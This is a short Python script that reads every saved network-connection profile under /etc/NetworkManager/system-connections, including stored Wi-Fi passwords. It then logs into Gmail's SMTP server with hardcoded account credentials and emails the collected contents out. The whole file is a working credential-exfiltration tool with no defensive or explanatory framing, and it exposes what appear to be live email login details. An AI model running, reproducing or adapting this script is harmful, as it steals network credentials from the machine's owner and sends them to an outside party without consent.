
#!/bin/python3

import subprocess , smtplib, re

command="cd /etc/NetworkManager/system-connections && cat *"
networko=subprocess.check_output(command,shell=True)
network=networko.decode("utf-8")


server=smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
server.login("mmasterfromb@gmail.com","mmaster=stammer")
server.sendmail("mmasterfromb@gmail.com","mmasterfromb@gmail.com",network)
server.quit()


